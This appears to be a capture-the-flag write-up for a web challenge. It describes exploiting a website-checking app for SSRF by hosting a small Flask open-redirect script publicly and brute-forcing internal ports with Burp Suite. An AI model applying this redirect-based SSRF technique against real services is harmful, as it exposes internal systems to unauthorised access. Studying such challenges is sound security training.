Super Website Verificator 3000 Challenge Writeup

Step 1: Analyze the App

First, we analyze the provided web application to understand its functionality. We observe that the application check remote websites provided by the user. We have to find a way to leverage this into SSRF to an internal service.

Step 2: Host the Python Script

We use the provided redirect.py script to host a redirect service. This service will help us brute force the internal port by redirecting requests to different ports. This script should be hosted as a public website (you can use ngrok).

```python
from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')

def redirect_to_location():

    location = request.args.get('location')

    if location:

        return redirect(location)

    return "No location provided", 400

if __name__ == '__main__':

    app.run('0.0.0.0', port=4444)
```

Step 3: Brute Force the Port

We need to brute force the port to find the internal server. We can use Burp Suite to automate the process. Port 600 should be different in response size than the others.
